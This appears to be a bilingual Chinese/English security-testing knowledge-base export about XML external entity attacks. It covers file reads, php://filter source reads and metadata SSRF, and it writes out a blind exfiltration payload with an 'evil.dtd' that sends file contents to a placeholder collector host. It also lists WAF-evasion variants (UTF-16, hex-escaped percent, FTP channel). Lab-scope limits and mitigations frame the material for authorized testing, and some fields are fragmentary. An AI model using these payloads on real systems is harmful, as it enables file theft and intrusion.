prerequisites.en: Prepare normal input, a unique marker, server logs, and a negative control; do not expand to non-lab assets, real credentials, or irreversible state.

overview.zh: 覆盖 XML 外部实体注入的基础验证：file:// 实体读取 Linux/Windows 文件、php://filter Base64 读取 PHP 源码、实体发起云元数据 SSRF，并附参数实体与 UTF-16 编码变体。适用于解析用户提交 XML 且未禁用 DTD 的入口。
overview.en: Covers foundational verification of XML external entity injection: file:// entities reading Linux/Windows files, php://filter Base64 reading of PHP source, entity-driven cloud-metadata SSRF, plus parameter-entity and UTF-16 encoding variants. Suitable for entry points parsing user XML with DTDs not disabled.

vulnerability.zh: 根因是解析不可信 XML 时允许 DTD 与外部实体加载，实体 SYSTEM 标识符可指向本地文件或内网地址；解析器未按安全预设配置（禁用外部实体与 DTD）时，文件读取与 SSRF 随之成立。
vulnerability.en: The root cause is parsing untrusted XML with DTDs and external entities allowed: entity SYSTEM identifiers can point at local files or intranet addresses. Without a secure parser preset disabling external entities and DTDs, file reads and SSRF follow.

exploitation.zh: 按 Payload 列表顺序使用：第 1 步声明 file:// 外部实体读取 {FILE_PATH}，响应出现文件内容即确认实体解析开启；第 2 步读 win.ini 验证 Windows 平台；第 3 步用 php://filter Base64 读 index.php，解码得到源码即确认 wrapper 可用；第 4 步以实体请求隔离模拟的元数据端点验证 SSRF。被 WAF 拦截时改用参数实体或 UTF-16 编码变体。
exploitation.en: Use in Payload list order: step 1 declares a file:// external entity reading {FILE_PATH}; file content in the response confirms entity parsing is on. Step 2 reads win.ini for the Windows platform; step 3 reads index.php via php://filter Base64, with decoded source confirming the wrapper works; step 4 requests an isolated, simulated metadata endpoint to verify SSRF. When blocked by a WAF, switch to parameter-entity or UTF-16 encoding variants.

mitigation.zh: 所有 XML 解析路径禁用 DTD、外部实体与 XInclude（如 libxml2 不启用 NOENT、Java 设 disallow-doctype-decl），并限制出站网络；修复后重放实体载荷应报 DTD 禁止且无文件内容回显。
mitigation.en: Disable DTDs, external entities, and XInclude on all XML parsing paths (e.g., libxml2 without NOENT, Java disallow-doctype-decl) and restrict outbound networking; after the fix, replayed entity payloads must report DTD-forbidden errors with no file content echoed.

description.zh: 核对 XML 外部实体 OAST 验证 的测试对象、账号、数据和停止条件；当前首要前置条件是“确认 XML 外部实体 OAST 验证 的目标、账号、数据、组件版本和停止条件均属于可回滚的授权实验范围。”。
description.en: Confirm the target, account, data, and stop conditions for XML External-Entity OAST Validation, including the documented prerequisites.

description.zh: 使用正常输入记录请求、状态码、响应体、处理时间和服务端日志，为后续单变量对照提供可重复证据。
description.en: Record the normal request, status, body, timing, and server logs so later single-variable comparisons have repeatable evidence.

description.zh: 只替换 XML 外部实体 OAST 验证 对应的一个输入，对照命令说明观察解析、授权或执行差异，并排除缓存、重试和随机延迟等假阳性。
description.en: Change one input for XML External-Entity OAST Validation, observe the documented parsing, authorization, or execution difference, and exclude cache, retry, and random-delay false positives.

title.zh: 保存证据并执行修复回归

description.zh: 保存最小请求、响应和日志证据，按“所有 XML 解析路径禁用 DTD、外部实体与 XInclude（如 libxml2 不启用 NOENT、Java 设 disallow-doctype-decl），并限制出站网络；修复后重放实体载荷应报 DTD 禁止且无文件内容回显。”完成修复后，重放正常与异常基线，确认业务功能保留且安全差异消失。
description.en: Preserve the minimal request, response, and log evidence, apply the documented mitigation, and replay normal and abnormal baselines to confirm behavior remains available while the security difference disappears.

analysis.zh: XML 外部实体 OAST 验证只有在唯一输入、最终解析或授权结果、服务端日志和可观察影响相互一致时才能确认。单一状态码、超时、错误文本、客户端显示或工具猜测只应作为线索，必须保留阴性对照和版本条件。
analysis.en: XML External-Entity OAST Validation is confirmed only when the unique input, final parsing or authorization result, server-side logs, and observable impact agree. A status code, timeout, error string, client display, or tool guess is only a lead; retain a negative control and exact version prerequisites.

opsecTips.zh: 一次只运行一个唯一标记，并限制请求次数、响应保存范围和实验持续时间。
opsecTips.en: Run one unique marker at a time and limit request count, retained response data, and experiment duration.

opsecTips.zh: 出现真实凭据、非实验数据、不可逆写入或非授权连接时立即停止并清理夹具。
opsecTips.en: Stop immediately and clean up the fixture on real credentials, non-lab data, irreversible writes, or unauthorized connections.

review.rationale: 使用自有 OAST 标记域确认解析器是否加载外部实体，不读取本地文件或云元数据。 保留原有合法攻击样例与变体，仅替换已证实的失效占位、协议错误或事实混淆，并补齐授权实验边界、检测证据、双语教程和权威引用。

description.zh: 声明 file:// 外部实体读取目标文件并回显；响应出现文件内容即确认外部实体解析开启，可继续枚举敏感文件。{FILE_PATH} 渲染为 Linux 读取路径。
description.en: Declare a file:// external entity to read the target file and reflect it; file content in the response confirms external-entity parsing is on, enabling sensitive-file enumeration. {FILE_PATH} renders to the Linux read path.

description.zh: 以实体读取 Windows win.ini；回显文件内容即确认 Windows 平台文件可读。
description.en: Read Windows win.ini via an entity; the file content in the response confirms readable Windows files.

description.zh: 以 php://filter Base64 读取 index.php；回显 Base64 串且解码得到源码即确认 PHP wrapper 可用。
description.en: Read index.php via php://filter Base64; a Base64 string that decodes to source code confirms the PHP wrapper works.

description.zh: 以实体请求云元数据地址；回显元数据 JSON 即确认解析器可发起出站请求（XXE→SSRF）。仅在授权实验中用隔离模拟端点替代真实元数据地址。
description.en: Request the cloud metadata address through an entity; metadata JSON in the response confirms parser-initiated outbound requests (XXE→SSRF). Replace the real metadata address with an isolated simulator in authorized labs only.

description.zh: 以外部参数实体加载远端 DTD；OAST 侧收到 DTD 请求即确认参数实体外部加载可用、WAF 未拦截外部 DTD 引用。{LAB_OAST} 渲染为带外验证域名。
description.en: Load a remote DTD via an external parameter entity; the DTD request arriving at your OAST confirms external parameter-entity loading and that WAF rules miss external DTD references. {LAB_OAST} renders to the out-of-band validation domain.

description.zh: 把完整 XXE 文档声明为 UTF-16 编码提交，WAF 若仅按 UTF-8/ASCII 字节匹配实体关键字将无法识别；验证时需真实以 UTF-16 编码发送。
description.en: Declares the full XXE document as UTF-16 so a WAF matching entity keywords in UTF-8/ASCII bytes misses it; the document must actually be sent UTF-16-encoded.

explanation.en: Declares the document encoding as UTF-16

explanation.zh: 实体引用触发文件读取
explanation.en: Entity reference triggering the file read

name.zh: 无回显 XXE 关联验证

description.zh: 覆盖无回显 XXE 的关联验证：从外部实体探测与参数实体声明，到参数实体把文件内容外带至攻击者端，并附 UTF-16LE 编码转换变体，用于在无输出场景确认实体注入与数据外带。
description.en: Covers correlation validation of blind XXE: from external-entity detection and parameter-entity declaration through parameter entities exfiltrating file contents to the attacker, with UTF-16LE encoding-conversion variants, confirming entity injection and data exfiltration in no-output scenarios.

prerequisites.zh: 确认 无回显 XXE 关联验证 的目标、账号、数据、组件版本和停止条件均属于可回滚的授权实验范围。
prerequisites.en: Confirm that the target, accounts, data, component version, and stop conditions for Blind XXE Correlation Validation are inside a reversible authorized lab scope.

prerequisites.zh: 准备正常输入、唯一标记、服务端日志和阴性对照；禁止扩展到非实验资产、真实凭据或不可回滚状态。
prerequisites.en: Prepare normal input, a unique marker, server logs, and a negative control; do not expand to non-lab assets, real credentials, or irreversible state.

overview.zh: 覆盖无回显 XXE 的关联验证：通用实体请求收集端确认出站可达、参数实体加载远端 DTD、再把文件内容经参数实体外带到收集端。适用于响应不回显实体内容、需以带外信号确认实体注入的场景。
overview.en: Covers correlated verification of blind (no-echo) XXE: a general entity requesting a collector to confirm outbound reachability, a parameter entity loading a remote DTD, then exfiltrating file contents via parameter entities to the collector. Suitable when responses never echo entity content and injection must be confirmed via out-of-band signals.

vulnerability.zh: 根因是解析器允许 DTD 与参数实体而应用不回显解析结果，攻击者以自有收集端作为带外 oracle；参数实体可在解析器加载的外部 DTD 中组合 file/eval/exfil 链，把本地文件内容编码进外带请求（该组合只能位于外部 DTD）。
vulnerability.en: The root cause is a parser allowing DTDs and parameter entities while the application never echoes parse results, letting attackers use their own collector as an out-of-band oracle; parameter entities combine file/eval/exfil chains inside the DOCTYPE to encode local file contents into exfiltration requests.

exploitation.zh: 按 Payload 列表顺序使用：第 1 步以通用实体请求 {LAB_OAST} 收集端，收到请求即确认解析器出站可达；第 2 步以参数实体加载远端 DTD，收到 DTD 请求即确认外部加载可用；第 3 步把 file/eval/exfil 参数实体组合放入 {LAB_OAST} 托管的外部 DTD，由文档内的参数实体引用触发外带，收集端收到含文件内容的请求即确认完整外带链路。被 WAF 拦截时改用 UTF-16LE 编码转换变体。
exploitation.en: Use in Payload list order: step 1 has a general entity request the {LAB_OAST} collector; receiving the request confirms the parser can reach out. Step 2 loads a remote DTD via a parameter entity; receiving the DTD request confirms external loading works. Step 3 combines file/eval/exfil parameter entities inside the DOCTYPE to exfiltrate the target file; the collector receiving the file contents confirms the complete exfiltration chain. When blocked by a WAF, switch to the UTF-16LE encoding-conversion variant.

mitigation.zh: 禁用 DTD 与参数实体（Java 设 disallow-doctype-decl，PHP libxml 关闭实体加载）并限制解析进程出站网络；修复后重放外带载荷收集端应无任何请求，DOCTYPE 提交应被直接拒绝。
mitigation.en: Disable DTDs and parameter entities (Java disallow-doctype-decl, PHP libxml entity loading off) and restrict parser-process outbound networking; after the fix, replaying exfiltration payloads must produce no collector requests and DOCTYPE submissions must be rejected outright.

title.en: Point an external entity at the collector

description.zh: 实体 SYSTEM 指向探测域名路径，解析器发起请求即证明出站可达，DNS 与 HTTP 任一命中均确认 XXE 漏洞存在。
description.en: Set the SYSTEM identifier to a probe domain; any DNS or HTTP hit proves outbound fetch and thus XXE presence.

title.zh: 参数实体加载远程 DTD
title.en: Load a remote DTD via parameter entities

description.zh: 改用参数实体在声明内部触发远程加载，实体内容不进入文档主体，适合无回显的场景建立稳定的外带利用通道。
description.en: Switch to parameter entities inside the DOCTYPE to trigger remote loads whose content never joins the body, ideal for blind setups.

title.zh: 参数实体 OOB 外带文件
title.en: Exfiltrate files out-of-band with parameter entities

description.zh: 远程 DTD 内声明文件实体并把内容拼进回连地址，目标文件内容随请求路径带出，控制端日志直接留下数据记录。
description.en: Inside the remote DTD declare a file entity and splice its contents into a callback URL so file data rides out in the request path.

description.zh: 请求被识别拦截时把 XML 转为 UTF-16LE 再提交，规则多按 UTF-8 特征编写，编码切换后仍能触发实体解析外带。
description.en: If requests are flagged, transcode the XML to UTF-16LE; rules keyed to UTF-8 signatures miss the re-encoded entity resolution.

analysis.zh: 无回显 XXE 关联验证只有在唯一输入、最终解析或授权结果、服务端日志和可观察影响相互一致时才能确认。单一状态码、超时、错误文本、客户端显示或工具猜测只应作为线索，必须保留阴性对照和版本条件。
analysis.en: Blind XXE Correlation Validation is confirmed only when the unique input, final parsing or authorization result, server-side logs, and observable impact agree. A status code, timeout, error string, client display, or tool guess is only a lead; retain a negative control and exact version prerequisites.

opsecTips.zh: 一次只运行一个唯一标记，并限制请求次数、响应保存范围和实验持续时间。
opsecTips.en: Run one unique marker at a time and limit request count, retained response data, and experiment duration.

opsecTips.zh: 出现真实凭据、非实验数据、不可逆写入或非授权连接时立即停止并清理夹具。
opsecTips.en: Stop immediately and clean up the fixture on real credentials, non-lab data, irreversible writes, or unauthorized connections.

review.rationale: 用唯一 DNS/HTTPS 标记关联解析器出站请求，要求服务日志与 OAST 时间戳同时成立。 保留原有合法攻击样例与变体，仅替换已证实的失效占位、协议错误或事实混淆，并补齐授权实验边界、检测证据、双语教程和权威引用。

description.zh: 以通用实体请求收集端；{LAB_OAST} 收到该请求即确认解析器出站可达，可作为无回显场景的关联探针。
description.en: Request the collector via a general entity; the request arriving at {LAB_OAST} confirms parser egress and doubles as the correlation probe for blind scenarios.

description.zh: 以参数实体加载远端 DTD；{LAB_OAST} 收到 DTD 请求即确认参数实体外部加载可用。
description.en: Load a remote DTD via a parameter entity; the DTD request arriving at {LAB_OAST} confirms external parameter-entity loading.

title.zh: 参数实体 OOB 文件外带

description.en: Combine file/eval/exfil parameter entities inside the DOCTYPE internal subset to exfiltrate the target file to the collector; the request carrying file content arriving at {LAB_OAST} confirms the full blind-exfiltration chain.

explanation.en: Parameter entity reading the local file

description.zh: 用 iconv 把 XXE 夹具转成 UTF-16LE，验证按字节匹配 ASCII 关键字的 WAF 是否漏检编码后的文档。
description.en: Converts the XXE fixture to UTF-16LE with iconv to test whether a WAF matching ASCII keywords byte-wise misses the encoded document.

name.zh: XXE 带外实体加载验证

description.zh: 覆盖 XXE 带外实体加载通道验证：从 HTTP 与 FTP 两条外带通道确认实体加载行为，到日志参数带外探测对照，用于确认解析器在无回显时是否发出外部实体请求。
description.en: Covers out-of-band entity-loading channel validation for XXE: from HTTP and FTP channels confirming entity-load behavior to log-parameter out-of-band probe controls, confirming whether the parser issues external entity requests when there is no inline output.

prerequisites.zh: 确认 XXE 带外实体加载验证 的目标、账号、数据、组件版本和停止条件均属于可回滚的授权实验范围。
prerequisites.en: Confirm that the target, accounts, data, component version, and stop conditions for XXE Out-of-Band Entity-Load Validation are inside a reversible authorized lab scope.

prerequisites.zh: 准备正常输入、唯一标记、服务端日志和阴性对照；禁止扩展到非实验资产、真实凭据或不可回滚状态。
prerequisites.en: Prepare normal input, a unique marker, server logs, and a negative control; do not expand to non-lab assets, real credentials, or irreversible state.

overview.zh: 覆盖 XXE 带外实体加载的协议通道验证：HTTP 与 FTP 两条外带通道确认实体加载行为，日志参数带外探测作为对照。用于确认解析器在无回显时确实发出外部实体请求并对比协议间出站限制差异。
overview.en: Covers protocol-channel verification of out-of-band XXE entity loading: HTTP and FTP exfiltration channels confirming entity-load behavior, with a log-parameter probe as comparison. Used to confirm the parser truly emits external entity requests without echo and to contrast outbound restrictions across protocols.

vulnerability.zh: 根因是解析器允许加载外部 DTD 与实体且出站协议不止 HTTP，FTP 等协议可能绕过仅放行 80/443 的出站规则；实体声明保留在 DOCTYPE 内即可发起带外请求。
vulnerability.en: The root cause is a parser loading external DTDs and entities with outbound protocols beyond HTTP: protocols like FTP may bypass rules that only permit 80/443; keeping entity declarations inside the DOCTYPE is enough to emit out-of-band requests.

exploitation.zh: 按 Payload 列表顺序使用：第 1 步引用远端 DTD 经参数实体把文件内容以 HTTP 外带，{LAB_OAST} 收到含内容请求即确认 HTTP 外带链可用；第 2 步同链路改用 FTP 外带，FTP 监听收到请求即确认 FTP 通道可用，并对比两种协议的出站限制差异；第 3 步以通用实体请求带 file 参数的记录端点作为行为对照。
exploitation.en: Use in Payload list order: step 1 references a remote DTD and exfiltrates file contents over HTTP via a parameter entity; {LAB_OAST} receiving the content-bearing request confirms the HTTP chain. Step 2 switches the same chain to FTP; the FTP listener receiving the request confirms the FTP channel and lets you contrast outbound restrictions between protocols. Step 3 requests a logging endpoint with a file parameter via a general entity as a behavioral comparison.

mitigation.zh: 解析器禁用 DTD 与外部实体，出站网络按协议与端口白名单严格限制并覆盖 FTP 等非常用协议；修复后重放两条通道载荷监听端均应无任何请求。
mitigation.en: Disable DTDs and external entities in the parser and restrict outbound networking by protocol and port allowlist covering uncommon protocols like FTP; after the fix, replaying both channel payloads must produce no listener requests.

title.en: Exfiltrate over HTTP with parameter entities

description.zh: 文档内部参数实体拉取控制端 DTD，DTD 再声明文件实体并把内容拼进回连地址，HTTP 日志即数据落点完成外带。
description.en: The DOCTYPE pulls evil.dtd via a parameter entity; that DTD splices file contents into a callback URL with HTTP logs as the drop point.

attackChain.payload:
<?xml version="1.0"?>
<!DOCTYPE foo [
<!ENTITY % xxe SYSTEM "http://{LAB_OAST}/evil.dtd">
%xxe;
]>
<foo></foo>

# evil.dtd
<!ENTITY % file SYSTEM "file://{FILE_PATH}">
<!ENTITY % eval "<!ENTITY % exfil SYSTEM 'http://{LAB_OAST}/log?data=%file;'>">
%eval;
%exfil;

description.en: When HTTP cannot carry multi-line files, switch to FTP so whole file contents stream out as FTP request parameters.

A status code, timeout, error string, client display, or tool guess is only a lead; retain a negative control and exact version prerequisites.

opsecTips.en: Run one unique marker at a time and limit request count, retained response data, and experiment duration.

opsecTips.en: Stop immediately and clean up the fixture on real credentials, non-lab data, irreversible writes, or unauthorized connections.

wafBypass.command:
<?xml version="1.0"?> 
 <!DOCTYPE foo [ 
 <!ENTITY % file SYSTEM "file://{FILE_PATH}"> 
 <!ENTITY % dtd SYSTEM "http://{LAB_OAST}/x.dtd"> %dtd; 
 ]> 
 <foo/>

description.zh: FTP 通道外带变体 — 绕过仅监控 HTTP 出网的检测：数据经 FTP 控制通道命令外带；成功判据：FTP 监听端在命令序列（如 CWD/RETR）中收到含文件内容的请求。
description.en: Bypasses HTTP-only egress monitoring by exfiltrating over the FTP control channel. Success: the FTP server receives the file contents as username parameters.

title.zh: 参数实体双层间接变体

description.zh: 本地 DOCTYPE 只含一次外链，文件读取与回传全部移到外部 DTD，规避 %file; 本地特征；成功判据：OAST 请求参数含文件内容。
description.en: Keeps only one outbound reference locally and moves file read plus send into the external DTD, evading local %file; signatures. Success: OAST request parameters contain file contents.

title.zh: 十六进制实体百分号变体

description.zh: 十六进制实体百分号变体 — 内层 % 的字符实体改用十六进制 % 而非十进制 % 书写，规避仅匹配固定转义形式的规则；该块置于外部 DTD 托管；成功判据：外带请求到达 {LAB_OAST}。
description.en: Encodes the inner % as % to vary from the usual % form and evade rules keyed on that fixed escape. Success: the exfil request arrives.

title.en: Validation step 1 for Blind XXE Out-of-Band Entity Resolution
